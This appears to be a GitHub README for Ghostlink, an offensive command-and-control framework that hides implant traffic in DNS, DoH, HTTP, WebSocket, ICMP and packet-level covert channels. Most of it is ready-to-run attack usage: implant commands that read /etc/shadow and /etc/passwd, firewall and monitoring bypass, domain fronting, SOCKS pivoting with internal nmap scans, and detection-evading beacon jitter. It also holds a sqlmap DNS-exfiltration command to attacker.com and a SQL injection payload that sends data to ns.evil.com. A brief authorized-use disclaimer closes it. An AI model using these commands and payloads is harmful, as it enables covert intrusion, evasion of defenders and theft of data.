# Ghostlink

**Adaptive multi-channel C2 framework with 9 covert channels, ECDHE key exchange, and AES-256-GCM encryption.**

[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
[![Channels](https://img.shields.io/badge/covert_channels-9-green)]()
[![Encryption](https://img.shields.io/badge/crypto-ECDHE%20%7C%20AES--256--GCM-red)]()
[![Version](https://img.shields.io/badge/version-0.8-orange)]()

Ghostlink tunnels encrypted C2 traffic through 9 protocols that DPI, IDS, and firewalls typically ignore. It adaptively scores channels by entropy and latency, rotates between them for diversity, and fails over automatically when a channel is disrupted.

---

## Architecture

```
                  SENDER                                 RECEIVER
             ┌──────────────┐                        ┌──────────────┐
plaintext ──>│ AES-256-GCM  │                        │ AES-256-GCM  │──> plaintext
             │   encrypt    │                        │   decrypt    │
             └──────┬───────┘                        └──────^───────┘
                    │                                       │
             ┌──────v───────┐                        ┌──────┴───────┐
             │    zlib      │                        │    zlib      │
             │  compress    │                        │  decompress  │
             └──────┬───────┘                        └──────^───────┘
                    │                                       │
             ┌──────v───────┐                        ┌──────┴─────────┐
             │ frame split  │                        │frame reassemble│
             │ (seq + CRC)  │                        │  (seq + CRC)   │
             └──────┬───────┘                        └──────^─────────┘
                    │                                       │
             ┌──────v───────────────────────────────────────┴───────┐
             │             ADAPTIVE CHANNEL SELECTOR                │
             │       entropy scoring · failover · rotate            │
             └──┬────┬────┬────┬────┬────┬────┬────┬────┬──────────┘
                │    │    │    │    │    │    │    │    │
                v    v    v    v    v    v    v    v    v
              DNS  DoH  HTTP   WS  ICMP  ISN  IPID  Time PktSz
```

---

## Covert Channels

| # | Channel | Flag | Technique | Stealth | Root | Throughput |
|---|---------|------|-----------|:-------:|:----:|:----------:|
| 1 | **DNS** | `-channel dns` | TXT query tunneling, base64 labels | 0.85 | -- | High |
| 2 | **DoH** | `-channel doh` | DNS-over-HTTPS (RFC 8484), bypasses DNS monitoring | 0.96 | -- | High |
| 3 | **HTTP** | `-channel http` | Cookie/User-Agent header smuggling, browser emulation | 0.90 | -- | High |
| 4 | **WebSocket** | `-channel websocket` | Persistent bidirectional tunnel, blends with web apps | 0.92 | -- | High |
| 5 | **ICMP** | `-channel icmp` | Echo request/reply payload embedding | 0.75 | Yes | High |
| 6 | **TCP ISN** | `-channel tcp_isn` | Initial Sequence Number steganography (2 bytes/SYN) | 0.70 | Yes | Low |
| 7 | **IP ID** | `-channel ip_id` | IPv4 Identification field modulation (2 bytes/pkt) | 0.72 | Yes | Low |
| 8 | **Timing** | `-channel timing` | Inter-packet delay encoding (bit0=50ms, bit1=150ms) | 0.95 | -- | ~40 bps |
| 9 | **Packet-size** | `-channel packet_size` | Payload size modulation (3 bits/pkt) | 0.80 | -- | ~300 bps |

---

## Quick Start

```bash
git clone https://github.com/byjanke/ghostlink && cd ghostlink
go build -o ghostlink-server ./cmd/server
go build -o ghostlink-client ./cmd/client
```

**Execute a command over encrypted DNS:**

```bash
# Server
./ghostlink-server -channel dns -addr 0.0.0.0:5353 -key "op"

# Client
./ghostlink-client -channel dns -addr 10.0.0.5:5353 -key "op" \
  -exec "cat /etc/passwd; netstat -tlnp"
```

---

## Encryption

| Mode | Flag | Description |
|------|------|-------------|
| **ECDHE** | `-ecdhe` | P-256 key exchange per session. Forward secrecy. No pre-shared secret needed. |
| **PSK** | `-key <pass>` | SHA-256 derived key. AES-256-GCM with random 12-byte nonce per message. |
| **Plain** | _(default)_ | No encryption. Raw covert channel only. |

---

## Usage

### Authoritative DNS Mode (firewall bypass)

Tunnels through the real DNS hierarchy. Works even behind corporate firewalls that only allow internal DNS.

```bash
# C2 server (authoritative NS for ns.example.com)
sudo ./ghostlink-server -domain ns.example.com -addr 0.0.0.0:53

# Implant
./ghostlink-client -domain ns.example.com -exec "whoami; hostname"
```

```
IMPLANT --> INTERNAL DNS --> FIREWALL --> ROOT/TLD --> AUTHORITATIVE NS (Ghostlink) --> C2
```

### DNS-over-HTTPS (bypass DNS monitoring)

All DNS traffic goes over HTTPS. Completely invisible to DNS-based monitoring, DPI, and firewall inspection.

```bash
# Direct mode
./ghostlink-server -channel doh -addr 0.0.0.0:443 -key "op"
./ghostlink-client -channel doh -addr http://C2_IP:443 -key "op" -exec "whoami"

# Via public resolver (traffic looks like normal Cloudflare DoH)
./ghostlink-client -channel doh \
  -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
  -exec "cat /etc/shadow"
```

### WebSocket Channel

Persistent bidirectional connection that blends with modern web application traffic.

```bash
./ghostlink-server -channel websocket -addr 0.0.0.0:8443 -ecdhe
./ghostlink-client -channel websocket -addr 127.0.0.1:8443 -ecdhe \
  -exec "id; uname -a"
```

### SOCKS5 Proxy

Tunnel all TCP traffic through any covert channel. Use with `proxychains`, `curl --socks5`, or any SOCKS-aware tool.

```bash
# C2 server
./ghostlink-server -channel http -addr 0.0.0.0:8080 -ecdhe

# Client starts SOCKS5 on port 1080
./ghostlink-client -channel http -addr C2:8080 -ecdhe -socks 1080

# Route traffic through the tunnel
curl --socks5 127.0.0.1:1080 http://internal.corp:8080/admin
proxychains nmap -sT -Pn 10.10.10.0/24
```

### Multi-Channel Hopping

Rotate between channels automatically every 30 seconds. Automatic failover if a channel drops.

```bash
./ghostlink-client -hop dns,http,websocket -addr C2:5353 -ecdhe
# [hop] dns -> http -> websocket -> dns (30s rotation)
```

### Domain Fronting

Use a CDN domain as TLS SNI to disguise HTTP channel traffic.

```bash
./ghostlink-client -channel http -addr C2:443 -ecdhe \
  -front ajax.googleapis.com
```

### Port Forwarding

```bash
# Tunnel RDP through DNS
./ghostlink-client -channel dns -addr C2:5353 -key piv \
  -forward 1080:10.10.10.50:3389

# Connect from operator machine
rdesktop 127.0.0.1:1080
```

### Interactive Shell

```bash
./ghostlink-server -channel dns -addr 0.0.0.0:16353 -ecdhe
./ghostlink-client -channel dns -addr C2:16353 -ecdhe -shell
```

---

## Beacon Jitter Profiles

Control implant timing to avoid detection by behavioral analysis.

| Profile | Flag | Interval | Behavior |
|---------|------|----------|----------|
| **Low & Slow** | `-jitter low_slow` | 2--10 min | Long intervals, 50% jitter. Hardest to detect. |
| **Office Day** | `-jitter office` | 10--90s | Active during 8AM--6PM, 3x slower at night/weekends. |
| **Night** | `-jitter night` | 5--30 min | Optimized for off-hours operations. |
| **Burst** | `-jitter burst` | 0.5--5s | 5 rapid pings, then 2 min pause. |
| **Random** | `-jitter random` | 5s--5 min | Maximally unpredictable, 90% jitter factor. |

```bash
./ghostlink-client -channel http -addr C2:8080 -ecdhe -jitter office
```

---

## Session Persistence

Auto-reconnect on connection loss with exponential backoff (5s, 10s, 15s... up to 60s cap).

```bash
./ghostlink-client -channel dns -addr C2:5353 -key op \
  -reconnect -retries 20 -shell
```

---

## Multi-Session C2

The server tracks all connected implants. Switch between sessions, send commands, or kill sessions from the interactive console.

```
ghostlink c2 v0.8 | dns | 0.0.0.0:5353 | PSK | proto v2
[*] waiting for connections...
[+] session from 10.0.0.5:42891
[+] session #1 registered
[+] session from 10.0.0.8:33012
[+] session #2 registered

c2> sessions
[*] 2 active session(s):
  * #1 -- 10.0.0.5:42891
    #2 -- 10.0.0.8:33012

c2> use 2
[*] active session: #2

c2> exec whoami
[*] command sent to session #2: whoami
[result] root

c2> kill 1
[*] session #1 killed
```

**Server commands:**

| Command | Description |
|---------|-------------|
| `sessions` / `list` | List all active sessions |
| `use <id>` | Switch active session |
| `kill <id>` | Terminate a session |
| `exec <cmd>` | Execute command on active session |
| `shell` | Spawn interactive shell |
| `upload <local> <remote>` | Upload file to implant |
| `download <remote>` | Download file from implant |
| `ping` | Heartbeat check |

---

## DNS Reconnaissance

Probe the network's DNS configuration before choosing a tunneling strategy.

```bash
./ghostlink-client -dns-recon
```

```
=== Ghostlink DNS Reconnaissance ===

[*] Resolver: System DNS
    Internal (acme.local)          + resolved
    External (google.com)          + resolved
[*] Resolver: Google
    Direct external DNS            + reachable (external DNS allowed)

[*] Record type availability (via 8.8.8.8):
    A      + allowed
    TXT    + allowed
    CNAME  + allowed
    MX     + allowed

[*] Recommendations:
    External DNS direct access:  YES -- use -channel dns (direct mode)
    TXT records allowed:         YES -- standard DNS tunneling works
    Recommended channel:         dns (direct)
```

---

## C Implant

Lightweight C implant (~30KB compiled) with zero dependencies. Supports DNS and HTTP channels.

```bash
# Build
gcc -Os -s -o ghostimpl implant/ghostimpl.c

# Cross-compile for Windows
x86_64-w64-mingw32-gcc -Os -s -o ghostimpl.exe implant/ghostimpl.c -lws2_32
```

```bash
# DNS mode
./ghostimpl dns 10.0.0.5 53 ns.evil.com "whoami"

# HTTP mode
./ghostimpl http 10.0.0.5 8080 "cat /etc/passwd"
```

---

## sqlmap Bridge

Dedicated bridge for capturing sqlmap DNS exfiltration data.

```bash
go build -o ghostlink-bridge ./bridge
sudo ./ghostlink-bridge -addr 0.0.0.0:53 -output exfiltrated.txt

# Run sqlmap with DNS exfil
sqlmap -u "https://target.com/page.php?id=1" \
  --dns-domain=attacker.com -D db -T users -C password --dump
```

Output:
```
[16:55:44] [10.0.0.5] admin:secret123
[16:55:45] [10.0.0.5] root:$6$salt$hash
```

---

## Red Team Scenarios

### SQL injection to DNS exfiltration

```bash
sudo ./ghostlink-server -domain ns.evil.com -addr 0.0.0.0:53
```

```sql
' UNION SELECT LOAD_FILE(CONCAT("\\\\",
  (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
   WHERE table_schema=DATABASE()),
  ".ns.evil.com\\a")) --
```

Zero outbound TCP from the target. Data flows through the DNS hierarchy to your authoritative server.

### Post-exploitation C2 over ICMP

```bash
sudo ./ghostlink-server -channel icmp -addr 0.0.0.0 -ecdhe
sudo ./ghostlink-client -channel icmp -addr 10.0.0.5 -ecdhe \
  -exec "id; uname -a; ifconfig"
```

No TCP sockets, no listening ports on the implant.

### Full tunnel through WebSocket + SOCKS5

```bash
./ghostlink-server -channel websocket -addr 0.0.0.0:8443 -ecdhe
./ghostlink-client -channel websocket -addr C2:8443 -ecdhe -socks 1080

# Scan internal network through the tunnel
proxychains nmap -sT -Pn 10.10.10.0/24 -p 22,80,443,3389
```

### Persistent implant with jitter

```bash
./ghostlink-client -channel doh \
  -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
  -ecdhe -jitter low_slow -reconnect -retries 50
```

Beacons every 2--10 minutes via DoH through Cloudflare. Auto-reconnects up to 50 times. Nearly invisible.

---

## Comparison

| | Ghostlink | dnscat2 | iodine | ptunnel | Cloak |
|---|:---:|:---:|:---:|:---:|:---:|
| Channels | **9** | 1 | 1 | 1 | 1 |
| DNS | Yes | Yes | Yes | -- | -- |
| DNS-over-HTTPS | Yes | -- | -- | -- | -- |
| HTTP | Yes | -- | -- | -- | -- |
| WebSocket | Yes | -- | -- | -- | -- |
| ICMP | Yes | -- | -- | Yes | -- |
| TCP ISN / IP ID | Yes | -- | -- | -- | -- |
| Timing / Pkt-size | Yes | -- | -- | -- | -- |
| SOCKS5 proxy | Yes | -- | -- | -- | -- |
| ECDH key exchange | Yes | -- | -- | -- | -- |
| Adaptive selection | Yes | -- | -- | -- | -- |
| Multi-channel hop | Yes | -- | -- | -- | -- |
| Beacon jitter | Yes | -- | -- | -- | -- |
| Multi-session C2 | Yes | -- | -- | -- | -- |
| Session persistence | Yes | -- | -- | -- | -- |
| C implant | Yes | -- | -- | -- | -- |

---

## Protocol

Ghostlink v0.8 uses protocol version 2 with backward compatibility for v1 messages.

```
v2 message format (8 bytes header):
  [version:1][type:1][stream_id:4][payload_len:2][payload:N]

v1 messages (7 bytes header, no version byte) are auto-detected and parsed.
```

Message types: `ShellStdin/Stdout/Stderr`, `CmdReq/Res`, `FilePut/GetReq/GetChunk`, `FwdConnect/Data/Close`, `SocksConnect/Data/Close`, `Ping/Pong`, `Reconnect`, `SessionID`, `Error`.

---

## Disclaimer

This tool is for **authorized red team assessments, penetration testing, and security research only**. Unauthorized use on networks you do not own or have explicit permission to test is illegal.

## License

MIT -- see [LICENSE](LICENSE)

---

<div align="center">

[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-sevbandonmez-FFDD00?style=flat&logo=buymeacoffee&logoColor=black)](https://www.buymeacoffee.com/sevbandonmez)

</div>
